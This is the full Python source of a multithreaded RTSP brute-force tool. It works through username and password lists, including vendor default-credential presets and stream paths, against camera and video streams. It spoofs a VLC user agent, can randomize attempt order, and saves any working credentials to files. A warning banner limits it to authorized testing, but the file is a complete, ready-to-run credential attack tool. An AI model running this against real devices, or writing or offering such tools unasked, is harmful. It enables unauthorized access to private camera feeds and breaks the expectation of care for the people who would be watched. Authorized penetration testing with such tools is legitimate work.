#!/usr/bin/env python3
"""
RTSP Brute Force Tool — Production-grade credential testing for RTSP services.

Supports vendor presets, multiple paths, wordlist directories, config files,
parallel workers, rate limiting, and scriptable CLI. For authorized use only.
"""

from __future__ import annotations

import argparse
import base64
import json
import logging
import random
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterator
from urllib.parse import urlparse

# Optional vendor data (built-in presets)
try:
    from rtsp_vendors import (
        VENDOR_DEFAULT_PASSWORDS,
        VENDOR_DEFAULT_USERS,
        VENDOR_PATHS,
    )
except ImportError:
    VENDOR_PATHS = {}
    VENDOR_DEFAULT_USERS = {}
    VENDOR_DEFAULT_PASSWORDS = {}

__version__ = "3.0.0"

# --- Constants -----------------------------------------------------------------

DEFAULT_PORT = 554
DEFAULT_TIMEOUT = 5
EXTENDED_TIMEOUT = 30
MAX_RETRIES = 2
RTSP_SCHEMES = ("rtsp", "rtsps")
USER_AGENT = "LibVLC/3.0.0"
BUFFER_SIZE = 4096
CREDENTIALS_ENCODING = "utf-8"
CREDENTIALS_ERRORS = "ignore"
DEFAULT_WORDLIST_DIR = "wordlists"

# --- Logging --------------------------------------------------------------------


def setup_logging(
    level: int = logging.INFO,
    log_file: str | None = None,
    quiet: bool = False,
) -> None:
    """Configure root logger with optional file and console handlers."""
    root = logging.getLogger()
    root.setLevel(level)
    for h in list(root.handlers):
        root.removeHandler(h)
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
    if log_file:
        fh = logging.FileHandler(log_file, encoding="utf-8")
        fh.setLevel(level)
        fh.setFormatter(fmt)
        root.addHandler(fh)
    if not quiet:
        ch = logging.StreamHandler(sys.stderr)
        ch.setLevel(level)
        ch.setFormatter(fmt)
        root.addHandler(ch)


# --- Data -----------------------------------------------------------------------


@dataclass
class RTSPTarget:
    """Parsed RTSP target (host, port, path)."""

    host: str
    port: int
    path: str
    raw_url: str

    def base_url(self, username: str, password: str) -> str:
        base = f"rtsp://{username}:{password}@{self.host}:{self.port}"
        return f"{base}/{self.path}".rstrip("/") if self.path else base.rstrip("/")


@dataclass
class RunConfig:
    """Runtime configuration."""

    targets: list[RTSPTarget]
    usernames: list[str]
    passwords: list[str]
    timeout: float = DEFAULT_TIMEOUT
    extended_timeout: float = EXTENDED_TIMEOUT
    max_retries: int = MAX_RETRIES
    workers: int = 4
    delay: float = 0.0
    stop_on_first: bool = True
    output_file: str | None = None
    json_report: str | None = None
    user_agent: str = USER_AGENT


@dataclass
class RunState:
    """Thread-safe shared state."""

    attempted: int = 0
    found: list[tuple[RTSPTarget, str, str]] = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)
    stop: bool = False

    def inc_attempted(self) -> None:
        with self.lock:
            self.attempted += 1

    def add_found(self, target: RTSPTarget, user: str, password: str, stop_on_first: bool = True) -> None:
        with self.lock:
            self.found.append((target, user, password))
            if stop_on_first:
                self.stop = True

    def get_found(self) -> list[tuple[RTSPTarget, str, str]]:
        with self.lock:
            return list(self.found)

    def should_stop(self) -> bool:
        with self.lock:
            return self.stop


# --- Paths & wordlists -----------------------------------------------------------


def get_script_dir() -> Path:
    """Directory containing the script (for default wordlist dir)."""
    return Path(__file__).resolve().parent


def resolve_wordlist_dir(given: str | None) -> Path | None:
    """Resolve wordlist root: given path, or script_dir/wordlists if exists."""
    if given:
        p = Path(given).resolve()
        return p if p.is_dir() else None
    default = get_script_dir() / DEFAULT_WORDLIST_DIR
    return default if default.is_dir() else None


def get_vendor_paths(vendor: str, wordlist_dir: Path | None) -> list[str]:
    """Paths for vendor: from wordlist_dir/vendors/<vendor>/paths.txt else built-in."""
    if wordlist_dir:
        path_file = wordlist_dir / "vendors" / vendor / "paths.txt"
        if path_file.is_file():
            lines = load_lines(str(path_file))
            if lines:
                return lines
    return list(VENDOR_PATHS.get(vendor, []))


def get_vendor_users(vendor: str, wordlist_dir: Path | None) -> list[str]:
    """Default usernames for vendor: file or built-in."""
    if wordlist_dir:
        uf = wordlist_dir / "vendors" / vendor / "users.txt"
        if uf.is_file():
            lines = load_lines(str(uf))
            if lines:
                return lines
    return list(VENDOR_DEFAULT_USERS.get(vendor, []))


def get_vendor_passwords(vendor: str, wordlist_dir: Path | None) -> list[str]:
    """Default passwords for vendor: file or built-in."""
    if wordlist_dir:
        pf = wordlist_dir / "vendors" / vendor / "passwords.txt"
        if pf.is_file():
            lines = load_lines(str(pf))
            if lines:
                return lines
    return list(VENDOR_DEFAULT_PASSWORDS.get(vendor, []))


def list_vendors() -> list[str]:
    """Sorted list of known vendor names."""
    return sorted(set(VENDOR_PATHS) | set(VENDOR_DEFAULT_USERS) | set(VENDOR_DEFAULT_PASSWORDS))


# --- Validation -----------------------------------------------------------------


def parse_rtsp_url(url: str) -> RTSPTarget | None:
    """Parse and validate RTSP URL. Returns RTSPTarget or None if invalid."""
    url = (url or "").strip()
    if not url:
        return None
    parsed = urlparse(url)
    if parsed.scheme.lower() not in RTSP_SCHEMES:
        return None
    host = parsed.hostname
    if not host:
        return None
    port = parsed.port if parsed.port is not None else DEFAULT_PORT
    if not (1 <= port <= 65535):
        return None
    path = (parsed.path or "").strip("/")
    return RTSPTarget(host=host, port=port, path=path, raw_url=url)


def build_target_from_base(base: RTSPTarget, path: str) -> RTSPTarget:
    """New target with same host/port, different path. path has no leading slash."""
    path = (path or "").strip().strip("/")
    raw = f"rtsp://{base.host}:{base.port}/{path}" if path else f"rtsp://{base.host}:{base.port}/"
    return RTSPTarget(host=base.host, port=base.port, path=path, raw_url=raw)


def load_lines(file_path: str) -> list[str]:
    """Load non-empty stripped lines from file. Returns [] on error."""
    path = Path(file_path)
    if not path.is_file():
        logging.error("File not found: %s", file_path)
        return []
    try:
        with open(path, "r", encoding=CREDENTIALS_ENCODING, errors=CREDENTIALS_ERRORS) as f:
            return [line.strip() for line in f if line.strip()]
    except OSError as e:
        logging.error("Cannot read file %s: %s", file_path, e)
        return []


def validate_config(config: RunConfig) -> list[str]:
    """Validate config; return list of error messages."""
    errors: list[str] = []
    if not config.targets:
        errors.append("No targets (URLs/paths) to test.")
    if not config.usernames:
        errors.append("No usernames provided.")
    if not config.passwords:
        errors.append("No passwords provided.")
    if config.workers < 1:
        errors.append("Workers must be at least 1.")
    if config.timeout <= 0 or config.extended_timeout <= 0:
        errors.append("Timeouts must be positive.")
    if config.delay < 0:
        errors.append("Delay cannot be negative.")
    return errors


# --- RTSP protocol --------------------------------------------------------------


def recv_rtsp_headers(sock: socket.socket, timeout: float) -> str:
    """Read until double CRLF or timeout."""
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            data = sock.recv(BUFFER_SIZE)
        except (socket.timeout, OSError):
            break
        if not data:
            break
        chunks.append(data)
        if b"\r\n\r\n" in b"".join(chunks):
            break
    return b"".join(chunks).decode(CREDENTIALS_ENCODING, errors=CREDENTIALS_ERRORS)


def try_single_credential(
    target: RTSPTarget,
    username: str,
    password: str,
    timeout: float,
    extended_timeout: float,
    max_retries: int,
    state: RunState,
    stop_on_first: bool,
    user_agent: str,
) -> bool:
    """Attempt one RTSP DESCRIBE with Basic auth. Returns True if 200 OK."""
    if state.should_stop():
        return False
    auth_str = f"{username}:{password}"
    auth_b64 = base64.b64encode(auth_str.encode(CREDENTIALS_ENCODING)).decode("ascii")
    full_url = target.base_url(username, password)
    request = (
        f"DESCRIBE {full_url} RTSP/1.0\r\n"
        f"CSeq: 2\r\n"
        f"Authorization: Basic {auth_b64}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "\r\n"
    )
    payload = request.encode(CREDENTIALS_ENCODING)
    used_extended = False
    for attempt in range(max_retries + 1):
        if state.should_stop():
            return False
        current_timeout = extended_timeout if used_extended else timeout
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(current_timeout)
            sock.connect((target.host, target.port))
            sock.sendall(payload)
            response = recv_rtsp_headers(sock, current_timeout)
            if "200 OK" in response:
                state.add_found(target, username, password, stop_on_first=stop_on_first)
                return True
            if "401" in response:
                return False
            if not used_extended:
                used_extended = True
        except socket.timeout:
            if not used_extended:
                used_extended = True
            else:
                return False
        except OSError:
            return False
        finally:
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    sock.close()
                except OSError:
                    pass
    return False


def credential_pairs(usernames: list[str], passwords: list[str]) -> Iterator[tuple[str, str]]:
    """Yield (username, password) pairs."""
    for u in usernames:
        for p in passwords:
            yield (u, p)


def run_attack(config: RunConfig, shuffle: bool = False) -> list[tuple[RTSPTarget, str, str]]:
    """Run parallel brute-force across all (target, user, pass). Returns list of (target, user, pass) found."""
    state = RunState()
    tasks: list[tuple[RTSPTarget, str, str]] = []
    for target in config.targets:
        for u, p in credential_pairs(config.usernames, config.passwords):
            tasks.append((target, u, p))
    total = len(tasks)
    if shuffle:
        random.shuffle(tasks)
    start_time = time.perf_counter()
    last_log = 0.0
    log_interval = 5.0

    def task(item: tuple[RTSPTarget, str, str]) -> bool:
        if state.should_stop():
            return False
        t, u, p = item
        state.inc_attempted()
        if config.delay > 0:
            time.sleep(config.delay)
        return try_single_credential(
            t, u, p,
            config.timeout, config.extended_timeout, config.max_retries,
            state, config.stop_on_first, config.user_agent,
        )

    logging.info("Starting: %s targets x %s users x %s passwords = %s tasks, %s workers",
                 len(config.targets), len(config.usernames), len(config.passwords), total, config.workers)

    with ThreadPoolExecutor(max_workers=config.workers) as executor:
        futures = {executor.submit(task, item): item for item in tasks}
        for future in as_completed(futures):
            if state.should_stop():
                for f in futures:
                    f.cancel()
                break
            now = time.perf_counter()
            if now - last_log >= log_interval:
                attempted = state.attempted
                rate = attempted / (now - start_time) if (now - start_time) > 0 else 0
                logging.info("Progress: %s / %s, %s found, %.1f/s", attempted, total, len(state.get_found()), rate)
                last_log = now

    elapsed = time.perf_counter() - start_time
    found = state.get_found()
    logging.info("Finished in %.1fs. Attempted %s, found %s.", elapsed, state.attempted, len(found))

    if config.output_file and found:
        try:
            with open(config.output_file, "w", encoding="utf-8") as f:
                for t, u, p in found:
                    f.write(f"{t.raw_url} {u}:{p}\n")
            logging.info("Wrote credentials to %s", config.output_file)
        except OSError as e:
            logging.error("Failed to write output file: %s", e)

    if config.json_report:
        report = {
            "targets_tested": [t.raw_url for t in config.targets],
            "attempted": state.attempted,
            "total_tasks": total,
            "elapsed_seconds": round(elapsed, 2),
            "found": [{"url": t.raw_url, "username": u, "password": p} for t, u, p in found],
        }
        try:
            with open(config.json_report, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2)
            logging.info("Wrote JSON report to %s", config.json_report)
        except OSError as e:
            logging.error("Failed to write JSON report: %s", e)

    return found


# --- CLI ------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="RTSP Brute Force Tool — credential testing (authorized use only).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")

    # Target
    parser.add_argument("--url", "-u", type=str, default="", help="Base RTSP URL (host:port[/path]); use with --path/--path-file/--vendor")
    parser.add_argument("--path", "-p", action="append", default=[], metavar="PATH", help="RTSP path to try (repeatable); no leading slash")
    parser.add_argument("--path-file", type=str, default="", help="File with one RTSP path per line")
    parser.add_argument("--vendor", "-V", action="append", default=[], metavar="NAME", help="Vendor preset: try built-in paths (repeatable)")
    parser.add_argument("--vendor-defaults", action="store_true", help="With --vendor: also use vendor default usernames/passwords if no --users/--passwords")

    # Credentials
    parser.add_argument("--users", "-U", type=str, default="", help="Comma-separated usernames")
    parser.add_argument("--user-file", type=str, default="", help="File with one username per line")
    parser.add_argument("--passwords", "-P", type=str, default="", help="Comma-separated passwords")
    parser.add_argument("--password-file", "-F", type=str, default="", help="Password list file")

    # Performance
    parser.add_argument("--workers", "-w", type=int, default=4, help="Parallel workers")
    parser.add_argument("--timeout", "-t", type=float, default=DEFAULT_TIMEOUT, help="Connection timeout (s)")
    parser.add_argument("--extended-timeout", type=float, default=EXTENDED_TIMEOUT, help="Timeout after first timeout (s)")
    parser.add_argument("--retries", "-r", type=int, default=MAX_RETRIES, help="Retries per credential")
    parser.add_argument("--delay", "-d", type=float, default=0.0, help="Delay between attempts per worker (s)")
    parser.add_argument("--shuffle", "-s", action="store_true", help="Randomize order of attempts")

    # Behavior
    parser.add_argument("--all", "-a", action="store_true", help="Report every valid credential (do not stop on first)")
    parser.add_argument("--user-agent", type=str, default=USER_AGENT, help="RTSP User-Agent header")

    # Output
    parser.add_argument("--output", "-o", type=str, default="", help="Write found credentials to file")
    parser.add_argument("--json", "-j", type=str, default="", help="Write JSON report to file")

    # Wordlists & config
    parser.add_argument("--wordlist-dir", "-W", type=str, default="", help="Wordlist root (e.g. wordlists/); vendor files under vendors/<name>/")
    parser.add_argument("--config", "-c", type=str, default="", help="JSON config file (options override file)")

    # Info
    parser.add_argument("--list-vendors", action="store_true", help="List built-in vendor names and exit")
    parser.add_argument("--list-paths", type=str, default="", metavar="VENDOR", help="List built-in paths for VENDOR and exit")

    # Logging & UX
    parser.add_argument("--log-file", type=str, default="", help="Append logs to file")
    parser.add_argument("--verbose", "-v", action="store_true", help="DEBUG logging")
    parser.add_argument("--quiet", "-q", action="store_true", help="Minimal console output")
    parser.add_argument("--no-banner", action="store_true", help="Do not print banner")
    parser.add_argument("--dry-run", action="store_true", help="Print config and exit without attacking")
    return parser.parse_args()


def load_config_file(path: str) -> dict:
    """Load JSON config file. Returns dict of options (key without --, values)."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        logging.warning("Config file %s: %s", path, e)
        return {}
    if not isinstance(data, dict):
        return {}
    return data


def apply_config_to_args(args: argparse.Namespace, config: dict) -> None:
    """Override args with config file values (only set in config)."""
    for key, value in config.items():
        key = key.replace("-", "_")
        if hasattr(args, key):
            if value is not None and getattr(args, key) in ((), [], "", None, 0, 0.0, False):
                if key == "path" and isinstance(value, list):
                    args.path = value
                elif key == "vendor" and isinstance(value, list):
                    args.vendor = value
                else:
                    setattr(args, key, value)


def collect_usernames(args: argparse.Namespace, wordlist_dir: Path | None, vendors: list[str], use_vendor_defaults: bool) -> list[str]:
    usernames: list[str] = []
    if args.users:
        usernames.extend(u.strip() for u in args.users.split(",") if u.strip())
    if args.user_file:
        usernames.extend(load_lines(args.user_file))
    if use_vendor_defaults and vendors and not usernames:
        for v in vendors:
            usernames.extend(get_vendor_users(v, wordlist_dir))
    return list(dict.fromkeys(usernames))


def collect_passwords(args: argparse.Namespace, wordlist_dir: Path | None, vendors: list[str], use_vendor_defaults: bool) -> list[str]:
    passwords: list[str] = []
    if args.passwords:
        passwords.extend(p.strip() for p in args.passwords.split(",") if p.strip())
    if args.password_file:
        passwords.extend(load_lines(args.password_file))
    if use_vendor_defaults and vendors and not passwords:
        for v in vendors:
            passwords.extend(get_vendor_passwords(v, wordlist_dir))
    return list(dict.fromkeys(passwords))


def build_targets(args: argparse.Namespace, wordlist_dir: Path | None) -> list[RTSPTarget]:
    """Build list of RTSPTarget from --url, --path, --path-file, --vendor."""
    url = (args.url or "").strip()
    if not url:
        return []
    base = parse_rtsp_url(url)
    if not base:
        return []
    paths: list[str] = []
    # Explicit path from URL
    if base.path:
        paths.append(base.path)
    for p in args.path or []:
        if p.strip():
            paths.append(p.strip().strip("/"))
    if args.path_file:
        paths.extend(load_lines(args.path_file))
    for v in args.vendor or []:
        paths.extend(get_vendor_paths(v.strip().lower(), wordlist_dir))
    paths = list(dict.fromkeys(p for p in paths if p is not None))
    if not paths:
        return [base]
    return [build_target_from_base(base, p) for p in paths]


def print_banner(quiet: bool, no_banner: bool) -> None:
    if quiet or no_banner:
        return
    print("""
╔═════════════════════════════════════════════════════════════════════════════╗
║                        RTSP BRUTE FORCE TOOL v3                             ║
║                        Developed by Andrey Pautov                         ║
║                         Email: 1200km@gmail.com                             ║
║─────────────────────────────────────────────────────────────────────────────║
║  ⚠  For authorized security testing only. Unauthorized use may be illegal. ║
╚═════════════════════════════════════════════════════════════════════════════╝
""", file=sys.stderr)


def interactive_prompt() -> RunConfig | None:
    """Prompt for URL, usernames, passwords. Single target."""
    url = input("Enter the RTSP URL (e.g. rtsp://192.168.1.1:554/stream): ").strip()
    if not url:
        return None
    target = parse_rtsp_url(url)
    if not target:
        logging.error("Invalid RTSP URL.")
        return None
    know_user = input("Do you know the username? (yes/no) [y/n]: ").strip().lower()
    if know_user in ("yes", "y"):
        usernames = [input("Enter the username: ").strip()]
    else:
        usernames = load_lines(input("Path to username list file: ").strip())
    if not usernames:
        logging.error("No usernames provided.")
        return None
    passwords = load_lines(input("Path to password list file: ").strip())
    if not passwords:
        logging.error("No passwords loaded.")
        return None
    return RunConfig(targets=[target], usernames=usernames, passwords=passwords, stop_on_first=True)


def main() -> int:
    args = parse_args()

    if args.list_vendors:
        for v in list_vendors():
            print(v)
        return 0
    if args.list_paths:
        vendor = args.list_paths.strip().lower()
        paths = get_vendor_paths(vendor, resolve_wordlist_dir(args.wordlist_dir or None))
        if not paths:
            print(f"Unknown or empty vendor: {vendor}", file=sys.stderr)
            return 2
        for p in paths:
            print(p)
        return 0

    if args.config:
        cfg = load_config_file(args.config)
        apply_config_to_args(args, cfg)

    quiet = args.quiet
    log_level = logging.DEBUG if args.verbose else logging.INFO
    setup_logging(level=log_level, log_file=args.log_file or None, quiet=quiet)
    print_banner(quiet, getattr(args, "no_banner", False))

    if not args.url and not args.user_file and not args.users and not args.password_file and not args.passwords:
        config = interactive_prompt()
        if not config:
            return 2
        errors = validate_config(config)
        if errors:
            for e in errors:
                logging.error("%s", e)
            return 2
        found = run_attack(config, shuffle=False)
        if found:
            for t, u, p in found:
                print(f"SUCCESS: {t.raw_url} {u}:{p}")
            return 0
        logging.warning("No valid credential found.")
        return 1

    if not args.url:
        logging.error("Missing --url. Use --url or run without arguments for interactive mode.")
        return 2

    wordlist_dir = resolve_wordlist_dir(args.wordlist_dir or None)
    if wordlist_dir and args.verbose:
        logging.debug("Wordlist dir: %s", wordlist_dir)

    targets = build_targets(args, wordlist_dir)
    if not targets:
        logging.error("No targets built from URL and paths.")
        return 2

    vendors = [v.strip().lower() for v in (args.vendor or []) if v.strip()]
    use_vendor_defaults = getattr(args, "vendor_defaults", False)

    usernames = collect_usernames(args, wordlist_dir, vendors, use_vendor_defaults)
    passwords = collect_passwords(args, wordlist_dir, vendors, use_vendor_defaults)
    if not usernames:
        logging.error("No usernames. Use --users, --user-file, or --vendor --vendor-defaults.")
        return 2
    if not passwords:
        logging.error("No passwords. Use --passwords, --password-file, or --vendor --vendor-defaults.")
        return 2

    config = RunConfig(
        targets=targets,
        usernames=usernames,
        passwords=passwords,
        timeout=args.timeout,
        extended_timeout=args.extended_timeout,
        max_retries=args.retries,
        workers=args.workers,
        delay=args.delay,
        stop_on_first=not args.all,
        output_file=args.output or None,
        json_report=args.json or None,
        user_agent=args.user_agent,
    )
    errors = validate_config(config)
    if errors:
        for e in errors:
            logging.error("%s", e)
        return 2

    if args.dry_run:
        print("Targets:", [t.raw_url for t in config.targets], file=sys.stderr)
        print("Usernames:", len(config.usernames), "Passwords:", len(config.passwords), file=sys.stderr)
        print("Total tasks:", len(config.targets) * len(config.usernames) * len(config.passwords), file=sys.stderr)
        return 0

    found = run_attack(config, shuffle=args.shuffle)
    if found:
        for t, u, p in found:
            print(f"SUCCESS: {t.raw_url} {u}:{p}")
        return 0
    logging.warning("No valid credential found.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
